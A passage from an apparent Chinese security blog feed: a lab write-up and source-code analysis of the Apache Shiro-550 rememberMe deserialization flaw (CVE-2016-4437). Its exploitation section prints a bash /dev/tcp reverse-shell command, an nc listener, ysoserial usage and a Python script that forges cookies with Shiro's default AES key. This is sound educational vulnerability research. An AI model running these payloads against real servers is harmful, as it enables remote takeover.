rel="noopener">https://www.cnblogs.com/tr1ple/p/11114958.html</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&mid=2247485857&idx=1&sn=1cf534df42999d5126fc3cf3b7fc8f9b" target="_blank" rel="noopener"><code>*CTF 2021 WriteUp By 星盟ctf战队</code></a><br>CBC字节翻转攻击: <a href="http://www.lmxspace.com/2018/05/07/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">http://www.lmxspace.com/2018/05/07/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</a><br>CBC字节翻转攻击:<a href="https://sec-in.com/article/274" target="_blank" rel="noopener">https://sec-in.com/article/274</a><br>Padding Oracle 和 CBC字节翻转攻击学习: <a href="https://www.cnblogs.com/tr1ple/p/11114958.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/11114958.html</a><br>Padding Oracle Attack: <a href="http://www.helix.cool/2020/05/18/Padding-Oracle-Attack/" target="_blank" rel="noopener">http://www.helix.cool/2020/05/18/Padding-Oracle-Attack/</a><br>我对Padding Oracle攻击的分析和思考（详细）：<a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/15504.html</a><br>Automated Padding Oracle Attacks With PadBuster：<a href="https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html" target="_blank" rel="noopener">https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html</a><br>Understanding MD5 Length Extension Attack:<a href="http://blog.chinaunix.net/uid-27070210-id-3255947.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-27070210-id-3255947.html</a><br>MD5哈希(hash)长度扩展攻击:<a href="https://ntwyc2018.github.io/2018/07/10/md5%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">https://ntwyc2018.github.io/2018/07/10/md5%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</a><br>Hash长度扩展攻击：<a href="https://www.smi1e.top/hello-world/" target="_blank" rel="noopener">https://www.smi1e.top/hello-world/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常见的 WEB 密码学攻击&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>shrio漏洞分析</title>
    <link href="https://blog.cfyqy.com/article/bb150e8a.html"/>
    <id>https://blog.cfyqy.com/article/bb150e8a.html</id>
    <published>2021-02-17T13:56:50.000Z</published>
    <updated>2021-03-03T01:27:16.913Z</updated>
    
    <content type="html"><![CDATA[<p>Shrio漏洞学习</p><a id="more"></a><h1 id="Shrio反序列化命令执行（Shiro-550-CVE-2016-4437）"><a href="#Shrio反序列化命令执行（Shiro-550-CVE-2016-4437）" class="headerlink" title="Shrio反序列化命令执行（Shiro-550 CVE-2016-4437）"></a>Shrio反序列化命令执行（Shiro-550 CVE-2016-4437）</h1><p>影响范围：<br>shiro &lt;= 1.2.4 存在反序列化漏洞    </p><p>漏洞缘由：<br>Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时：</p><ul><li>检索RememberMe Cookie的值</li><li>Base 64解码</li><li>AES解密（加密密钥硬编码）</li><li>进行反序列化操作（未过滤处理）</li></ul><p>攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令  </p><p>漏洞影响：<br>只要rememberMe的AES加密密钥泄漏，无论shiro什么版本都会导致反序列化漏洞。</p><p>漏洞搭建：<br><a href="https://github.com/Medicean/VulApps/tree/master/s/shiro/1" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/tree/master/s/shiro/1</a><br>拉取镜像到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure><p>启动环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d -p 8081:8080 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure><p>访问8081端口</p><p><img src="../../images/java/shiro/3.png" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>相关环境：<br>靶机：192.168.247.130<br>攻击机：192.168.247.129</p><p>使用Shiro_exploit工具，检查是否存在默认的key。 </p><p>Github项目地址：  <a href="https://github.com/insightglacier/Shiro_exploit" target="_blank" rel="noopener">https://github.com/insightglacier/Shiro_exploit</a>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -u http://192.168.247.130:8081/</span><br></pre></td></tr></table></figure><p>存在默认key： CipherKey:kPH+bIxk5D2deZiIxcaaaA==<br><img src="../../images/java/shiro/4.png" alt=""></p><p>利用方式一：反弹shell    </p><p>制作反弹shell 代码<br>使用<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a> 进行编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -I &gt;&amp; /dev/tcp 192.168.247.129/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="../../images/java/shiro/5.png" alt=""></p><p>使用 ysoserial 中 JRMP 监听模块，监听6666端口<br>ysoserial 地址: <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a><br>攻击机中执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 <span class="string">'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0Ny4xMjkvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span></span><br></pre></td></tr></table></figure><p><img src="../../images/java/shiro/6.png" alt=""><br>监听反弹端口 1234<br>攻击机中执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure><p>生成 POC<br>shrio.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial.jar'</span>, <span class="string">'JRMPClient'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])   </span><br><span class="line">    print(<span class="string">"rememberMe=&#123;0&#125;"</span>.format(payload.decode()))</span><br></pre></td></tr></table></figure><p>shrio.py 和 ysoserial.jar 放在同一目录下，攻击机中执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro.py 192.168.247.129:6666</span><br></pre></td></tr></table></figure><p>得到rememberMe<br><img src="../../images/java/shiro/7.png" alt=""><br>抓取登录后的数据包,修改 cookie的 rememberMe 。<br><img src="../../images/java/shiro/8.png" alt=""><br>反弹成功<br><img src="../../images/java/shiro/9.png" alt=""></p><p><strong>利用方式二：写入shell</strong><br>生成poc.ser</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">"echo 'this a test' &gt; /tmp/shell"</span> &gt; poc.ser</span><br></pre></td></tr></table></figure><p>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRemember</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">"d://poc.ser"</span>));</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里没尝试成功  </p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>环境搭建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//jdk1.6版本  window jdk版本切换：w </span><br><span class="line">//maven 3.2.5 maven历史版本下载 https://blog.csdn.net/still_ly/article/details/80905149</span><br><span class="line">//tomcat 7</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git </span><br><span class="line">git checkout shiro-root-1.2.4 </span><br><span class="line"><span class="built_in">cd</span> ./shiro/samples/web </span><br><span class="line">mvn package -D maven.skip.test=<span class="literal">true</span></span><br></pre></td></tr></table></figure><p>在.m2目录下创建一个toolchains.xml文件，然后加入jdk 1.6的路径，这个版本的编译依赖jdk1.6</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;toolchains xmlns=<span class="string">"http://maven.apache.org/TOOLCHAINS/1.1.0"</span> xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span><br><span class="line">  xsi:schemaLocation=<span class="string">"http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd"</span>&gt;</span><br><span class="line">  &lt;toolchain&gt;</span><br><span class="line">    &lt;<span class="built_in">type</span>&gt;jdk&lt;/<span class="built_in">type</span>&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;1.6&lt;/version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;/vendor&gt;</span><br><span class="line">    &lt;/provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">      &lt;jdkHome&gt;C:\Program Files\Java\jdk1.6.0_45\&lt;/jdkHome&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">  &lt;/toolchain&gt;</span><br><span class="line">&lt;/toolchains&gt;</span><br></pre></td></tr></table></figure><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin设置断点，点击debug开启tomcat服务，在web端登陆账户，勾选Remember Me按钮，<br><img src="../../images/java/shiro/10.png" alt=""><br>首先代码对调用 forgetIdentity 对subject变量进行处理，跟进此方法，即CookieRememberMeManager类的forgetIdentity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.web.mgt.CookieRememberMeManager</span></span><br><span class="line"> <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">forgetIdentity</span><span class="params">(Subject subject)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (WebUtils.isHttp(subject)) &#123;</span><br><span class="line">            HttpServletRequest request = WebUtils.getHttpRequest(subject);</span><br><span class="line">            HttpServletResponse response = WebUtils.getHttpResponse(subject);</span><br><span class="line">            <span class="keyword">this</span>.forgetIdentity(request, response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用 另一 forgetIdentity 方法处理request和response请求，这里调用了removeFrom方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.web.mgt.CookieRememberMeManager</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">forgetIdentity</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.getCookie().removeFrom(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>removeFrom 添加 response 的头部信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.web.servlet.SimpleCookie</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeFrom</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">        String name = <span class="keyword">this</span>.getName();</span><br><span class="line">        String value = <span class="string">"deleteMe"</span>;</span><br><span class="line">        String comment = <span class="keyword">null</span>;</span><br><span class="line">        String domain = <span class="keyword">this</span>.getDomain();</span><br><span class="line">        String path = <span class="keyword">this</span>.calculatePath(request);</span><br><span class="line">        <span class="keyword">int</span> maxAge = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> version = <span class="keyword">this</span>.getVersion();</span><br><span class="line">        <span class="keyword">boolean</span> secure = <span class="keyword">this</span>.isSecure();</span><br><span class="line">        <span class="keyword">boolean</span> httpOnly = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">this</span>.addCookieHeader(response, name, value, (String)comment, domain, path, maxAge, version, secure, httpOnly);</span><br><span class="line">        log.trace(<span class="string">"Removed '&#123;&#125;' cookie by setting maxAge=0"</span>, name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后，重新返回到 onSuccessfulLogin 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.forgetIdentity(subject);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.isRememberMe(token)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.rememberIdentity(subject, token, info);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">"AuthenticationToken did not indicate RememberMe is requested.  RememberMe functionality will not be executed for corresponding account."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里判断是否对token进行了isRememberMe，这个 isRememberMe 看是否在这个web登陆中勾选了remember me，这里已勾选，继续下一步</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isRememberMe</span><span class="params">(AuthenticationToken token)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> token != <span class="keyword">null</span> &amp;&amp; token <span class="keyword">instanceof</span> RememberMeAuthenticationToken &amp;&amp; ((RememberMeAuthenticationToken)token).isRememberMe();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>进入 rememberIdentity 方法中,principals 为 用户名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)</span> </span>&#123;</span><br><span class="line">        PrincipalCollection principals = <span class="keyword">this</span>.getIdentityToRemember(subject, authcInfo);</span><br><span class="line">        <span class="keyword">this</span>.rememberIdentity(subject, principals);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>又调用另外一个重载 rememberIdentity，跟进其方法，通过convertPrincipalsToBytes对accountPrincipals变量进行处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">        <span class="keyword">this</span>.rememberSerializedIdentity(subject, bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进convertPrincipalsToBytes方法发现它会序列化我们传入的用户名，然后调用encrypt方法加密序列化后的二进制字节。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line"> <span class="keyword">protected</span> <span class="keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.serialize(principals);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            bytes = <span class="keyword">this</span>.encrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进encrypt,使用AES的 CBC分组加密模式，加密秘钥this.getEncryptionCipherKey() 和DEFAULT_CIPHER_KEY_BYTES 一致</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line">   <span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] value = serialized;</span><br><span class="line">        CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.encrypt(serialized, <span class="keyword">this</span>.getEncryptionCipherKey());</span><br><span class="line">            value = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再返回rememberIdentity，将序列化用户名并AES加密的二进制字节传入rememberSerializedIdentity方法中，进行base64编码，跟进此方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">        <span class="keyword">this</span>.rememberSerializedIdentity(subject, bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>将传入的二进制字节进行base64编码并添加到cookie中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.web.mgt.CookieRememberMeManager</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberSerializedIdentity</span><span class="params">(Subject subject, <span class="keyword">byte</span>[] serialized)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!WebUtils.isHttp(subject)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                String msg = <span class="string">"Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to set the rememberMe cookie. Returning immediately and ignoring rememberMe operation."</span>;</span><br><span class="line">                log.debug(msg);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            HttpServletRequest request = WebUtils.getHttpRequest(subject);</span><br><span class="line">            HttpServletResponse response = WebUtils.getHttpResponse(subject);</span><br><span class="line">            String base64 = Base64.encodeToString(serialized);</span><br><span class="line">            Cookie template = <span class="keyword">this</span>.getCookie();</span><br><span class="line">            Cookie cookie = <span class="keyword">new</span> SimpleCookie(template);</span><br><span class="line">            cookie.setValue(base64);</span><br><span class="line">            cookie.saveTo(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>cookie.saveTo()将cookie的相关属性值添加到reponse请求包头部。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveTo</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">this</span>.getName();</span><br><span class="line">    String value = <span class="keyword">this</span>.getValue();</span><br><span class="line">    String comment = <span class="keyword">this</span>.getComment();</span><br><span class="line">    String domain = <span class="keyword">this</span>.getDomain();</span><br><span class="line">    String path = <span class="keyword">this</span>.calculatePath(request);</span><br><span class="line">    <span class="keyword">int</span> maxAge = <span class="keyword">this</span>.getMaxAge();</span><br><span class="line">    <span class="keyword">int</span> version = <span class="keyword">this</span>.getVersion();</span><br><span class="line">    <span class="keyword">boolean</span> secure = <span class="keyword">this</span>.isSecure();</span><br><span class="line">    <span class="keyword">boolean</span> httpOnly = <span class="keyword">this</span>.isHttpOnly();</span><br><span class="line">    <span class="keyword">this</span>.addCookieHeader(response, name, value, comment, domain, path, maxAge, version, secure, httpOnly);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密过程就是将登入的用户名进行反序列化，并用AbstractRememberMeManager类的DEFAULT_CIPHER_KEY_BYTES（硬编码）值做为key，进行AES的CBC分组模式进行加密，然后又base64编码，最后添加到response请求包的set-cookie头部里</p><h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p>在org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals 方法设置断点<br><img src="../../images/java/shiro/11.jpg" alt=""><br>调用getRememberedSerializedIdentity处理http请求,跟进此方法，利用this.getCookie().readValue(request, response)读取 cookie 中 rememberMe 的值，并对其值进行base64解码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.web.mgt.CookieRememberMeManager</span></span><br><span class="line">    <span class="keyword">protected</span> <span 